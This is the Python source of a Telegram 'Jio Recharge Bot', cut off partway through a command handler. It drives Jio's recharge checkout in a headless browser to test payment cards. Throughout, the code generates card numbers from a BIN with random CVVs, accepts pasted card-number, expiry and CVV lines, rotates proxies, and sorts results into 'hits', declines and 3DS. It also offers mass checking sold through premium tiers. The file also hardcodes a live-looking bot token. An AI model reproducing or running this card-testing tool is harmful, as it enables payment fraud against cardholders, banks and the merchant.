# Jio Recharge Bot — v5 (timeout-killer build)
import telebot, re, time, os, sys, json, threading, random, datetime, subprocess, traceback, gc
from concurrent.futures import ThreadPoolExecutor, TimeoutError as FuturesTimeout
from pathlib import Path

try:
    sys.stdout.reconfigure(encoding='utf-8')
except:
    pass

# =====================================================================
# THEME
# =====================================================================
E = {
    "fire": "🔥", "skull": "💀", "bolt": "⚡", "crown": "👑", "gem": "💎",
    "target": "🎯", "rocket": "🚀", "shield": "🛡️", "sword": "⚔️",
    "check": "✅", "cross": "❌", "warn": "⚠️", "info": "ℹ️",
    "phone": "📱", "money": "💰", "card": "💳", "globe": "🌐",
    "clock": "⏱️", "box": "📦", "chart": "📊", "star": "⭐",
    "eye": "👁️", "lock": "🔒", "key": "🔑", "wave": "👋",
    "cross_marks": "⛔", "cash": "💸", "firewall": "🧱"
}
SEP = "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰"
SEP_THIN = "▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱"

def styled_result_head(status):
    heads = {
        "success":        f"{E['check']} <b>HIT SUCCESSFUL</b> {E['check']}",
        "3ds":            f"{E['fire']} <b>3DS REQUIRED</b> {E['fire']}",
        "insufficient":   f"{E['cash']} <b>INSUFFICIENT FUNDS</b> {E['cash']}",
        "expired":        f"{E['clock']} <b>CARD EXPIRED</b> {E['clock']}",
        "invalid_cvv":    f"{E['lock']} <b>INVALID CVV</b> {E['lock']}",
        "invalid_card":   f"{E['cross']} <b>INVALID CARD</b> {E['cross']}",
        "issuer_decline": f"{E['cross_marks']} <b>CARD ISSUER DECLINED</b>",
        "blocked":        f"{E['firewall']} <b>CARD BLOCKED</b>",
        "not_permitted":  f"{E['cross_marks']} <b>NOT PERMITTED</b>",
        "limit_exceeded": f"{E['chart']} <b>LIMIT EXCEEDED</b>",
        "velocity":       f"{E['warn']} <b>VELOCITY LIMIT</b>",
        "processor_error":f"{E['bolt']} <b>PROCESSOR ERROR</b>",
        "failed":         f"{E['cross']} <b>DECLINED</b>",
        "unknown":        f"{E['info']} <b>UNKNOWN</b>",
        "error":          f"{E['warn']} <b>ERROR</b>",
    }
    return heads.get(status, f"{E['warn']} <b>UNKNOWN</b>")

status_head = styled_result_head

# =====================================================================
# CHROMIUM LOCATION
# =====================================================================
_CHROMIUM_READY = threading.Event()
_CHROMIUM_PATH = {"path": None}
_CHROMIUM_LOCK = threading.Lock()

def _find_chromium():
    import shutil
    from glob import glob
    candidates = [
        "/ms-playwright/chromium-*/chrome-linux/chrome",
        "/ms-playwright/chromium-*/chrome-linux/headless_shell",
        "/ms-playwright/chromium_headless_shell-*/chrome-linux/headless_shell",
        "/root/.cache/ms-playwright/chromium-*/chrome-linux/chrome",
        "/root/.cache/ms-playwright/chromium-*/chrome-linux/headless_shell",
        "/home/*/.cache/ms-playwright/chromium-*/chrome-linux/chrome",
        "/usr/bin/chromium", "/usr/bin/chromium-browser",
        "/usr/bin/google-chrome", "/usr/bin/google-chrome-stable",
        shutil.which("chromium"), shutil.which("chromium-browser"),
        shutil.which("google-chrome"), shutil.which("google-chrome-stable"),
    ]
    for c in candidates:
        if not c: continue
        if "*" in c:
            m = sorted(glob(c))
            if m: return m[-1]
        else:
            if Path(c).exists(): return c
    return None

def _verify_chromium_once():
    print("[BOOT] Verifying Chromium...")
    found = _find_chromium()
    if found:
        _CHROMIUM_PATH["path"] = found
        _CHROMIUM_READY.set()
        print(f"[BOOT] Chromium found: {found}")
        return
    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            path = p.chromium.executable_path
            if path and Path(path).exists():
                _CHROMIUM_PATH["path"] = path
                _CHROMIUM_READY.set()
                print(f"[BOOT] Chromium OK: {path}")
                return
    except Exception as e:
        print(f"[BOOT] Check failed: {str(e)[:120]}")

    def installer():
        print("[BOOT] Installing Chromium...")
        try: subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "playwright"], timeout=300)
        except: pass
        try: subprocess.check_call([sys.executable, "-m", "playwright", "install-deps", "chromium"], timeout=300)
        except: pass
        try: subprocess.check_call([sys.executable, "-m", "playwright", "install", "chromium"], timeout=300)
        except Exception as e:
            print(f"[BOOT] install failed: {str(e)[:120]}")
            return
        found = _find_chromium()
        if found:
            _CHROMIUM_PATH["path"] = found
            _CHROMIUM_READY.set()
            print(f"[BOOT] Chromium ready: {found}")

    threading.Thread(target=installer, daemon=True).start()

threading.Thread(target=_verify_chromium_once, daemon=True).start()

# =====================================================================
# ZOMBIE CLEANUP
# =====================================================================
def _kill_zombie_browsers():
    try:
        subprocess.run(["pkill", "-9", "-f", "chrome-linux/chrome"], timeout=10, capture_output=True)
        subprocess.run(["pkill", "-9", "-f", "headless_shell"], timeout=10, capture_output=True)
    except: pass

def _zombie_cleanup_loop():
    while True:
        time.sleep(600)  # 10 min
        _kill_zombie_browsers()
        gc.collect()

threading.Thread(target=_zombie_cleanup_loop, daemon=True).start()

# =====================================================================
# BROWSER POOL — one browser, many pages (memory efficient)
# =====================================================================
class BrowserPool:
    """Singleton browser reuse across checks. Kills timeout issues."""

    def __init__(self):
        self._lock = threading.Lock()
        self._playwright = None
        self._browser = None
        self._ctx = None

    def _start(self):
        """Start playwright + browser if not running."""
        from playwright.sync_api import sync_playwright
        if self._playwright is None:
            self._playwright = sync_playwright().start()
        if self._browser is None or not self._browser.is_connected():
            exe = _CHROMIUM_PATH.get("path") or _find_chromium()
            launch_kwargs = {
                "headless": True,
                "args": [
                    "--no-sandbox",
                    "--disable-dev-shm-usage",
                    "--disable-gpu",
                    "--disable-software-rasterizer",
                    "--disable-extensions",
                    "--disable-background-networking",
                    "--disable-sync",
                    "--disable-translate",
                    "--no-first-run",
                    "--no-default-browser-check",
                    "--disable-setuid-sandbox",
                    "--disable-accelerated-2d-canvas",
                    "--disable-accelerated-video-decode",
                    "--disable-features=TranslateUI,BlinkGenPropertyTrees,IsolateOrigins,site-per-process",
                    "--memory-pressure-off",
                ],
                "timeout": 90000,  # 90s max (from start)
            }
            if exe and Path(exe).exists():
                launch_kwargs["executable_path"] = exe
            try:
                self._browser = self._playwright.chromium.launch(**launch_kwargs)
                print("[POOL] Browser launched")
            except Exception as e:
                # fallback — try install
                print(f"[POOL] Launch failed: {str(e)[:120]}")
                try: subprocess.check_call([sys.executable, "-m", "playwright", "install", "chromium"], timeout=300)
                except: pass
                launch_kwargs.pop("executable_path", None)
                self._browser = self._playwright.chromium.launch(**launch_kwargs)
                print("[POOL] Browser launched (after install)")

    def get_context(self):
        """Return a fresh isolated context (cookies/cache clean)."""
        with self._lock:
            self._start()
            ctx = self._browser.new_context(
                viewport={"width": 1366, "height": 768},
                user_agent=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                            "AppleWebKit/537.36 (KHTML, like Gecko) "
                            "Chrome/120.0.0.0 Safari/537.36"),
            )
            return ctx

    def reset(self):
        """Force close and restart browser."""
        with self._lock:
            try:
                if self._browser: self._browser.close()
            except: pass
            self._browser = None

_pool = BrowserPool()

# =====================================================================
# JIO CORE
# =====================================================================
def _jio_dbg(msg): print(f"[jio] {msg}", flush=True)

def _urldecode(s):
    try:
        from urllib.parse import unquote
        return unquote(s)
    except: return s

def _page_text(page):
    try: text = page.locator("body").inner_text(timeout=4000)
    except: text = ""
    return re.sub(r"\s+", " ", text).strip()

def luhn_check_digit(pan):
    d=[int(x) for x in pan]; d.reverse(); t=0
    for i,x in enumerate(d):
        if i%2==0:
            x*=2
            if x>9: x-=9
        t+=x
    return str((10-t%10)%10)

def generate_cards(bin_str, mm, yyyy, count):
    b = re.sub(r"\D", "", bin_str)
    total_len = 15 if b.startswith(("34","37")) else 16
    out = []
    for _ in range(count):
        pre = b + "".join(random.choices("0123456789", k=max(total_len-1-len(b),0)))
        pan = pre + luhn_check_digit(pre)
        out.append({"pan":pan,"exp_month":mm.zfill(2),"exp_year":yyyy,
                    "cvv":f"{random.randint(0,999):03d}"})
    return out

def parse_card_line(line):
    parts = re.split(r"[|/:\s]+", line.strip())
    if len(parts) < 4: return None
    pan, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if not re.fullmatch(r"\d{13,19}", pan): return None
    mm = mm.zfill(2)
    if len(yy)==4: yyyy=yy
    elif len(yy)==2: yyyy="20"+yy
    else: yyyy="20"+yy.zfill(2)
    return {"pan":pan,"exp_month":mm,"exp_year":yyyy,"cvv":cvv}

def card_label(card):
    return f"{card['pan']}|{card['exp_month']}|{card['exp_year'][-2:]}|{card['cvv']}"


def jio_checkout(phone, amount, card, deadline=None, proxy=None, headless=True):
    """Uses browser pool. Returns (status, message, url, meta)."""
    if deadline is None: deadline = time.time() + 180
    meta = {"merchant":"Jio Recharge","amount":amount,"plan":""}

    ctx = None
    try:
        ctx = _pool.get_context()
    except Exception as e:
        # pool failed — try reset + retry once
        print(f"[jio] Pool context failed: {str(e)[:120]}")
        _pool.reset()
        try:
            ctx = _pool.get_context()
        except Exception as e2:
            return "error", f"Browser pool failed: {str(e2)[:120]}", "", meta

    page = ctx.new_page()
    try:
        page.goto("https://www.jio.com/selfcare/recharge/mobility",
                  wait_until="domcontentloaded", timeout=45000)
        page.wait_for_timeout(2500)
        frame = page.main_frame
        callback = {}
        def _capture_cb(req):
            if "myjio-b2b-callback" in req.url: callback["url"] = req.url
        page.on("request", _capture_cb)

        pay_url = frame.evaluate(
            """async (arg) => {
                const phone = arg.phone, amt = arg.amt;
                const tmo = (ms) => new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), ms));
                const fj = (u, o) => Promise.race([fetch(u, o), tmo(45000)]);
                const rn = await fj('/api/jio-recharge-service/recharge/mobility/number/' + phone);
                if (rn.status !== 200) return {error: true, msg: 'notsub'};
                const rp = await fj('/api/jio-recharge-service/recharge/plans/serviceId/' + phone);
                if (rp.status !== 200) return {error: true, msg: 'plans'};
                const d = await rp.json();
                let key = null;
                for (const c of d.planCategories || [])
                  for (const sc of (c.subCategories || []))
                    for (const pl of (sc.plans || []))
                      if (String(pl.amount) === String(amt) && pl.key) { key = pl.key; break; }
                if (!key) return {error: true, msg: 'noplan'};
                await fj('/api/jio-recharge-service/recharge/buy', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({planKey: key, selectedService: phone})});
                const rpay = await fj('/api/jio-recharge-service/recharge/pay', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({addonPlanKeys:[], flexiTopupFlow:false, servicePlanList:[{planKey: key, quantity:1, serviceId: phone}]})});
                const j = await rpay.json();
                return {error: false, url: j.paymentURL || null};
              }""",
            {"phone": str(phone), "amt": str(amount)},
        )
        if pay_url.get("error"):
            if pay_url.get("msg") == "notsub":
                return "error", f"Number {phone} is not a Jio prepaid subscriber.", page.url, meta
            if pay_url.get("msg") == "noplan":
                return "error", f"No ₹{amount} plan for {phone}.", page.url, meta
            return "error", f"Could not fetch Jio plans for {phone}.", page.url, meta
        if not pay_url.get("url"):
            return "error", f"Could not generate payment link.", page.url, meta

        try: page.goto(pay_url["url"], wait_until="domcontentloaded", timeout=45000)
        except: pass
        page.wait_for_timeout(2500)
        try: page.wait_for_url("**pay.jio.com**", timeout=25000)
        except: pass
        page.wait_for_timeout(1500)

        pf = page.main_frame
        clicked_card = False
        for _ in range(15):
            clicked_card = pf.evaluate("""() => {
              const els=[...document.querySelectorAll('*')];
              const el=els.find(e=>{const t=(e.innerText||'').trim();return /Credit\\/Debit|ATM Card|Debit Card|Credit Card/i.test(t)&&t.length<40&&e.children.length<=1&&e.offsetParent!==null;});
              if(!el)return false;
              let n=el;for(let i=0;i<8&&n;i++){if(/j-listBlock\\b|align-middle/.test((n.className||'').toString())&&n.offsetParent!==null){n.click();return true;}n=n.parentElement;}
              if(el.click){el.click();return true;}return false;
            }""")
            if clicked_card: break
            page.wait_for_timeout(800)
        page.wait_for_timeout(3000)

        for _ in range(20):
            if "add-new-card" in page.url or "saved-cards" in page.url: break
            if "cardinalcommerce" in page.url or "3dsecure" in page.url.lower(): break
            if "home" in page.url and "/JpgWebApp/home" in page.url:
                pf = page.main_frame
                pf.evaluate("""() => {
                  const els=[...document.querySelectorAll('*')];
                  const el=els.find(e=>{const t=(e.innerText||'').trim();return /Credit\\/Debit|ATM Card|Debit Card|Credit Card/i.test(t)&&t.length<40&&e.children.length<=1&&e.offsetParent!==null;});
                  if(!el)return false;
                  let n=el;for(let i=0;i<8&&n;i++){if(/j-listBlock\\b|align-middle/.test((n.className||'').toString())&&n.offsetParent!==null){n.click();return true;}n=n.parentElement;}
                  if(el.click){el.click();return true;}return false;
                }""")
            page.wait_for_timeout(800)
        page.wait_for_timeout(1500)
        pf = page.main_frame

        def fresh():
            nonlocal pf
            pf = page.main_frame

        def fill(name, val):
            try:
                loc = pf.locator(f"input[name='{name}']")
                if loc.count(): loc.first.fill(val, timeout=3000)
            except: fresh()

        pan = card.get("pan","").replace(" ","")
        exp = f"{card.get('exp_month','')}/{card.get('exp_year','')[-2:]}"
        for _ in range(4):
            try:
                fill("Card number", pan)
                fill("Expiry (MM/YY)", exp)
                fill("CVV", card.get("cvv",""))
                fill("Name on the card", "Card Holder")
            except: fresh()
            page.wait_for_timeout(400)
            try:
                got = pf.locator("input[name='Card number']").first.input_value() \
                    if pf.locator("input[name='Card number']").count() else ""
                if got and got.replace(" ","")[:6] == pan[:6]: break
            except: fresh()

        page.keyboard.press("Tab"); page.wait_for_timeout(400)
        page.keyboard.press("Tab"); page.wait_for_timeout(3000)

        for _ in range(10):
            try:
                clicked = pf.evaluate("""() => {
                  const b=[...document.querySelectorAll('button')].find(e=>/^Pay\\s|Pay now|Verify & pay/i.test((e.innerText||'').trim()) && !e.disabled);
                  if(b){b.click(); return (b.innerText||'').slice(0,30);} return null;
                }""")
                if clicked: break
            except: fresh()
            page.wait_for_timeout(800)
        page.wait_for_timeout(3000)
        fresh()

        try:
            pf.evaluate("""() => {
              const els=[...document.querySelectorAll('*')];
              const el=els.find(e=>(/INR|INDIAN RUPEE/i.test((e.innerText||'').trim()))&&(e.innerText||'').length<80&&e.children.length<=1);
              if(el){let n=el;for(let i=0;i<6&&n;i++){if(n.click){n.click();break;}n=n.parentElement;}}
            }""")
        except: pf = page.main_frame
        page.wait_for_timeout(2500)

        for _ in range(20):
            u = page.url
            if "cardinalcommerce" in u or "3dsecure" in u.lower(): break
            if "paytm" in u or "payglocal" in u: break
            if "easebuzz" in u or "acs" in u:
                page.wait_for_timeout(800); continue
            page.wait_for_timeout(800)

        if "payglocal" in page.url:
            for _ in range(10):
                try:
                    pgf = page.main_frame
                    ziploc = pgf.locator("#gl_billing_addressPostalCode")
                    if ziploc.count(): ziploc.first.fill("10080", timeout=2500); break
                except: pass
                page.wait_for_timeout(800)
            for _ in range(10):
                try:
                    pgf = page.main_frame
                    if pgf.evaluate("""() => {
                      const bs=[...document.querySelectorAll('button')];
                      const b=bs.find(e=>(/\\u20b9/.test(e.innerText||'')&&/Pay/i.test(e.innerText||'')&&!e.disabled));
                      if(b){b.click();return true;}return false;
                    }"""): break
                except: pass
                page.wait_for_timeout(800)
            page.wait_for_timeout(3000)

        if "paytm" in page.url and "selectCurrency" in page.url:
            for _ in range(12):
                if pf.evaluate("""() => {
                  const els=[...document.querySelectorAll('*')];
                  const el=els.find(e=>{const t=(e.innerText||'').trim();return /Indian Rupee|INR/i.test(t)&&t.length<60&&e.children.length<=1&&e.offsetParent!==null;});
                  if(el){let n=el;for(let i=0;i<8&&n;i++){if(n.click&&n.offsetParent!==null){n.click();break;}n=n.parentElement;}return true;}
                  return false;
                }"""): break
                page.wait_for_timeout(800)
            page.wait_for_timeout(1500)
            for _ in range(5):
                if pf.evaluate("""() => {
                  const b=[...document.querySelectorAll('button')].find(e=>/Proceed|Pay|Continue|Make Payment/i.test((e.innerText||'').trim())&&!e.disabled);
                  if(b){b.click();return true;}return false;
                }"""): break
                page.wait_for_timeout(800)
            page.wait_for_timeout(2500)

        stalled = 0
        for i in range(30):
            page.wait_for_timeout(1200)
            u = page.url
            if callback.get("url"):
                em = re.search(r"errorMessage=([^&]*)", callback["url"])
                ec = re.search(r"errorCode=([^&]*)", callback["url"])
                emsg = _urldecode(em.group(1)) if em else ""
                ecode = ec.group(1) if ec else ""
                if ecode == "0" or (not ecode and not emsg):
                    return "success", "Payment done.", u, meta
                if "declin" in emsg.lower() or (ecode and ecode != "0"):
                    return "failed", "Declined: " + emsg[:120], u, meta
            if "cardinalcommerce" in u or "3dsecure" in u.lower(): return "requires_action", "3DS required.", u, meta
            if "3ds2" in u or "instaproxy" in u:
                for _ in range(4):
                    page.wait_for_timeout(1200)
                    if callback.get("url"): break
                    if "instaproxy" not in page.url and "3ds2" not in page.url: break
                if callback.get("url"): continue
                if "instaproxy" in page.url or "3ds2" in page.url:
                    return "requires_action", "3DS required.", page.url, meta
                continue
            if "payglocal" in page.url and ("retry" in page.url or "payflow-ui/error" in page.url):
                return "failed", "Declined.", page.url, meta
            if "payglocal" in page.url:
                plow = _page_text(page).lower()
                if any(w in plow for w in ("payment unsuccessful","was not successful","could not process",
                    "payment failed","transaction was declined","your payment was declined",
                    "insufficient","declined","not completed","unsuccessful","try again later","try again")):
                    return "failed", "Declined.", page.url, meta
                _three_ds = False
                for f in page.frames:
                    fu = f.url
                    if ("authentication.cardinalcommerce.com" in fu and "threedsecure" in fu.lower()) \
                       or "3ds2/authenticate" in fu or "cruise/stepup" in fu.lower() or "V2/Cruise/StepUp" in fu:
                        _three_ds = True; break
                if _three_ds:
                    resolved = False
                    for _ in range(12):
                        page.wait_for_timeout(1200)
                        cu = page.url; clow = _page_text(page).lower()
                        if "payglocal" in cu and "retry" in cu: return "failed", "Declined.", page.url, meta
                        if any(w in clow for w in ("payment unsuccessful","was not successful","could not process",
                            "transaction was declined","your payment was declined","declined","unsuccessful","insufficient")):
                            return "failed", "Declined.", page.url, meta
                        if "termurlpay" in cu or "payments/termurlpay" in cu:
                            resolved = True; break
                    if resolved: continue
                    return "requires_action", "3DS required.", page.url, meta
                for f in page.frames:
                    if "step-up-iframe" in (f.name or "") and f.url and f.url != "about:blank" \
                       and "cardinalcommerce" not in f.url and "fingerprint" not in f.url.lower():
                        return "requires_action", "3DS required.", page.url, meta
            if "theia/error" in page.url or ("/error" in page.url and "paytm" in page.url):
                return "failed", "Declined by Paytm.", page.url, meta
            if "paytm" in page.url and "theia" in page.url:
                stalled += 1
                if stalled > 12: return "unknown", "Stuck on Paytm.", page.url, meta
            low = _page_text(page).lower()
            if any(w in low for w in ("declined","transaction failed","could not be processed",
                "payment failed","not completed","unsuccessful","insufficient","card not","failed")):
                return "failed", "Declined.", page.url, meta
            if any(w in low for w in ("transaction successful","recharge successful","successfully recharged",
                "payment successful","thank you","recharged","top-up successful","recharge done")):
                return "success", "Payment done.", page.url, meta
            if "card number" in low and "cv" in low and i > 4:
                return "failed", "Card rejected, form reset.", page.url, meta
            if time.time() > deadline: break
        return "unknown", "Couldn't confirm result.", page.url, meta
    except Exception as exc:
        return "error", f"Checkout failed: {str(exc)[:150]}", page.url, meta
    finally:
        try: page.close()
        except: pass
        try: ctx.close()
        except: pass

# =====================================================================
# BOT CONFIG
# =====================================================================
BOT_TOKEN = '8970318644:AAGrG_g7UQUONWus5nj2xm5E3WoLtQr6GT4'
ADMIN_ID = 8752143085
bot = telebot.TeleBot(BOT_TOKEN)

os.makedirs('JioData', exist_ok=True)
PREMIUM_FILE = 'JioData/premium.txt'
USERS_FILE = 'JioData/users.txt'
BANNED_FILE = 'JioData/banned.txt'
HITS_FILE = 'JioData/hits.txt'
PROXY_FILE = 'JioData/proxies.txt'

ADMIN_LIMIT = 50
PREMIUM_LIMIT = 15
FREE_LIMIT = 0
WORKERS = 1

ACTIVE_JOBS = {}
ACTIVE_USERS_MPP = {}

for f in [USERS_FILE, PREMIUM_FILE, BANNED_FILE, HITS_FILE, PROXY_FILE]:
    if not os.path.exists(f): open(f, 'w').close()

# =====================================================================
# HELPERS
# =====================================================================
def is_admin(uid): return int(uid) == ADMIN_ID

def is_premium(uid):
    try:
        with open(PREMIUM_FILE, 'r') as f:
            for p in f.read().splitlines():
                parts = p.split('|')
                if len(parts) < 2: continue
                if str(uid) == parts[0].strip():
                    exp = float(parts[1])
                    if exp == 0 or time.time() < exp: return True
    except: pass
    return False

def is_banned(uid):
    try:
        with open(BANNED_FILE, 'r') as f:
            for b in f.read().splitlines():
                parts = b.split('|')
                if len(parts) < 2: continue
                if str(uid) == parts[0].strip():
                    exp = float(parts[1])
                    if exp == 0 or time.time() < exp: return True
    except: pass
    return False

def add_user(uid):
    try:
        with open(USERS_FILE, 'r') as f: users = f.read().splitlines()
        if str(uid) not in users:
            with open(USERS_FILE, 'a') as f: f.write(str(uid) + '\n')
    except: pass

def parse_duration(dur):
    dur = dur.lower().strip(); now = time.time()
    if dur in ('lifetime','life','forever','inf','0'): return 0
    try:
        if dur.endswith('mo'): return now + int(dur[:-2]) * 86400 * 30
        if dur.endswith('s'): return now + int(dur[:-1])
        if dur.endswith('m'): return now + int(dur[:-1]) * 60
        if dur.endswith('h'): return now + int(dur[:-1]) * 3600
        if dur.endswith('d'): return now + int(dur[:-1]) * 86400
        if dur.endswith('w'): return now + int(dur[:-1]) * 86400 * 7
        if dur.endswith('y'): return now + int(dur[:-1]) * 86400 * 365
        return now + int(dur) * 86400
    except: return None

def add_premium(tid, exp):
    tid = str(tid).strip()
    try:
        with open(PREMIUM_FILE, 'r') as f: lines = f.readlines()
        with open(PREMIUM_FILE, 'w') as f:
            for l in lines:
                if not l.startswith(tid + "|"): f.write(l)
        with open(PREMIUM_FILE, 'a') as f: f.write(f"{tid}|{exp}\n")
        return True
    except: return False

def remove_premium(tid):
    tid = str(tid).strip()
    try:
        with open(PREMIUM_FILE, 'r') as f: lines = f.readlines()
        with open(PREMIUM_FILE, 'w') as f:
            for l in lines:
                if not l.startswith(tid + "|"): f.write(l)
        return True
    except: return False

# =====================================================================
# PROXY
# =====================================================================
proxy_list = []

def load_proxies():
    global proxy_list
    proxy_list = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as f:
            proxy_list = [l.strip() for l in f if l.strip()]
    return len(proxy_list)

def save_proxies(proxies):
    with open(PROXY_FILE, 'w') as f:
        for p in proxies: f.write(p + '\n')
    load_proxies()

def get_random_proxy():
    if not proxy_list: return None
    return random.choice(proxy_list)

def proxy_dict(entry):
    if not entry: return None
    try:
        host, port, user, pw = entry.split(":")
        return {"server": f"http://{host}:{port}", "username": user, "password": pw}
    except: return None

load_proxies()

# =====================================================================
# CLASSIFY
# =====================================================================
def classify(st, dt):
    if st == "requires_action": st = "3ds"
    low = (dt or "").lower()
    if st == "failed":
        if "insufficient" in low: st = "insufficient"
        elif "expired" in low: st = "expired"
        elif "cvv" in low or "cvc" in low: st = "invalid_cvv"
        elif "do not honor" in low or "issuer" in low: st = "issuer_decline"
        elif "blocked" in low or "stolen" in low or "lost" in low: st = "blocked"
        elif "not permitted" in low or "international" in low: st = "not_permitted"
        elif "limit" in low: st = "limit_exceeded"
        elif "processor" in low or "network" in low or "try again" in low or "timeout" in low:
            st = "processor_error"
    return st, dt

def run_one_check(phone, amount, card, proxy_str=None, timeout=180):
    proxy = proxy_dict(proxy_str) if proxy_str else None
    try:
        with ThreadPoolExecutor(max_workers=1) as ex:
            future = ex.submit(jio_checkout, phone, amount, card, proxy=proxy, headless=True)
            try:
                res = future.result(timeout=timeout)
            except FuturesTimeout:
                # reset pool on timeout
                _pool.reset()
                return "error", f"Timeout"
            except Exception as te:
                if "timeout" in str(te).lower():
                    _pool.reset()
                    return "error", f"Timeout"
                raise
    except Exception as e:
        return "error", f"Failed: {str(e)[:120]}"

    try:
        if isinstance(res, tuple) and len(res) >= 2:
            st, dt = res[0], res[1]
        else:
            return "error", "Bad result"
    except: return "error", "Parse failed"

    try: return classify(st, dt)
    except: return "error", "Classify failed"

run_check = run_one_check

# =====================================================================
# PROXY COMMANDS
# =====================================================================
@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    uid = message.from_user.id
    if is_banned(uid):
        bot.reply_to(message, f"{E['cross']} <b>You are banned.</b>", parse_mode="HTML"); return
    add_user(uid)
    parts = message.text.strip().split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, f"{E['box']} <b>Use:</b> /proxy add/list/remove", parse_mode="HTML"); return
    cmd = parts[1].split()[0].lower()
    arg = parts[1][len(cmd):].strip()

    if cmd == 'add':
        add_list = []
        if arg: add_list = [l.strip() for l in arg.splitlines() if l.strip()]
        elif message.reply_to_message:
            raw = message.reply_to_message.text or message.reply_to_message.caption or ''
            add_list = [l.strip() for l in raw.splitlines() if l.strip()]
        if not add_list:
            bot.reply_to(message, f"{E['box']} /proxy add host:port:user:pass", parse_mode="HTML"); return
        existing = []
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, 'r') as f: existing = [l.strip() for l in f if l.strip()]
        eset = set(existing)
        new = [p for p in add_list if p not in eset]
        save_proxies(existing + new)
        bot.reply_to(message,
            f"{E['chart']} <b>Proxy Add Result</b>\n{SEP_THIN}\n"
            f"┣ {E['box']} Total ➜ {len(add_list)}\n"
            f"┣ {E['check']} Added ➜ {len(new)}\n"
            f"┗ 🔄 Duplicate ➜ {len(add_list)-len(new)}",
            parse_mode="HTML")
    elif cmd == 'remove':
        if not arg: bot.reply_to(message, f"{E['box']} /proxy remove index/all", parse_mode="HTML"); return
        if not os.path.exists(PROXY_FILE): bot.reply_to(message, f"{E['cross']} No proxies", parse_mode="HTML"); return
        with open(PROXY_FILE, 'r') as f: proxies = [l.strip() for l in f if l.strip()]
        if arg == 'all':
            save_proxies([]); bot.reply_to(message, f"{E['check']} <b>All proxies removed</b>", parse_mode="HTML"); return
        try:
            idx = int(arg)
            if idx < 1 or idx > len(proxies):
                bot.reply_to(message, f"{E['cross']} Invalid. Total: {len(proxies)}", parse_mode="HTML"); return
            removed = proxies.pop(idx-1); save_proxies(proxies)
            bot.reply_to(message, f"{E['check']} Removed ➜ {removed}\n{E['box']} Remaining ➜ {len(proxies)}", parse_mode="HTML")
        except: bot.reply_to(message, f"{E['box']} /proxy remove index/all", parse_mode="HTML")
    elif cmd == 'list':
        if not proxy_list: bot.reply_to(message, f"{E['cross']} No proxies", parse_mode="HTML"); return
        lines = [f"{E['chart']} <b>Proxies ({len(proxy_list)})</b>", SEP_THIN]
        for i, p in enumerate(proxy_list, 1):
            masked = p[:30]+'...' if len(p) > 33 else p
            lines.append(f"┣ {i}. {masked}")
        if len(proxy_list) > 50:
            lines = lines[:50] + [f"┗ ... and {len(proxy_list)-50} more"]
        else: lines[-1] = lines[-1].replace('┣', '┗')
        bot.reply_to(message, "\n".join(lines), parse_mode="HTML")
    else:
        bot.reply_to(message, f"{E['cross']} <b>Unknown command</b>", parse_mode="HTML")

# =====================================================================
# USER COMMANDS
# =====================================================================
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if is_banned(uid):
        bot.reply_to(message, f"{E['cross']} <b>You are banned.</b>", parse_mode="HTML"); return
    add_user(uid)
    ready = f"{E['check']} Ready" if _CHROMIUM_READY.is_set() else f"{E['clock']} Installing..."
    rk = "[ADMIN]" if is_admin(uid) else ("[PREMIUM]" if is_premium(uid) else "[FREE]")
    bot.reply_to(message,
        f"{E['fire']} <b>JIO RECHARGE BOT</b> {E['fire']}\n{SEP}\n"
        f"{E['eye']} <b>User</b> ➤ {message.from_user.first_name}\n"
        f"{E['gem']} <b>ID</b> ➤ <code>{uid}</code>\n"
        f"{E['crown']} <b>Rank</b> ➤ {rk}\n"
        f"{E['shield']} <b>Browser</b> ➤ {ready}\n{SEP}\n"
        f"{E['bolt']} /jio — Single check\n"
        f"{E['box']} /mjio — Mass check\n"
        f"{E['globe']} /proxy — Manage proxies\n"
        f"{E['info']} /info — Account info\n"
        f"{E['star']} /stats — Bot stats\n{SEP}",
        parse_mode="HTML")

@bot.message_handler(commands=['jio'])
def jio_single(message):
    uid = message.from_user.id
    if is_banned(uid):
        bot.reply_to(message, f"{E['cross']} <b>You are banned.</b>", parse_mode="HTML"); return
    add_user(uid)
    args = message.text.split()
    if len(args) < 4:
        bot.reply_to(message,
            f"{E['box']} <b>Usage:</b> <code>/jio &lt;phone&gt; &lt;amount&gt; &lt;pan|mm|yy|cvv&gt;</code>\n"
            f"<b>Example:</b> <code>/jio 9876543210 239 5131112233445566|03|30|086</code>",
            parse_mode="HTML"); return
    phone, amount, cc = args[1], args[2], args[3]
    card = parse_card_line(cc)
    if not card:
        bot.reply_to(message, f"{E['cross']} <b>Invalid card format.</b>", parse_mode="HTML"); return

    if not _CHROMIUM_READY.is_set():
        wait_msg = bot.reply_to(message, f"{E['clock']} <b>Chromium not ready. Waiting (max 3 min)...</b>", parse_mode="HTML")
        if not _CHROMIUM_READY.wait(timeout=180):
            try: bot.delete_message(message.chat.id, wait_msg.message_id)
            except: pass
            bot.reply_to(message, f"{E['cross']} <b>Chromium not ready. Try again.</b>", parse_mode="HTML")
            return
        try: bot.delete_message(message.chat.id, wait_msg.message_id)
        except: pass

    msg = bot.reply_to(message,
        f"{E['clock']} <b>Step 1/5: Launching browser...</b>\n{SEP_THIN}\n"
        f"{E['phone']} <b>Phone</b> ➤ <code>{phone}</code>\n"
        f"{E['money']} <b>Amount</b> ➤ ₹{amount}\n"
        f"{E['card']} <b>Card</b> ➤ <code>{card_label(card)}</code>",
        parse_mode="HTML")

    def update_step(step, text, elapsed):
        try:
            bot.edit_message_text(
                f"{E['clock']} <b>{step}:</b> {text}\n{SEP_THIN}\n"
                f"{E['phone']} <b>Phone</b> ➤ <code>{phone}</code>\n"
                f"{E['money']} <b>Amount</b> ➤ ₹{amount}\n"
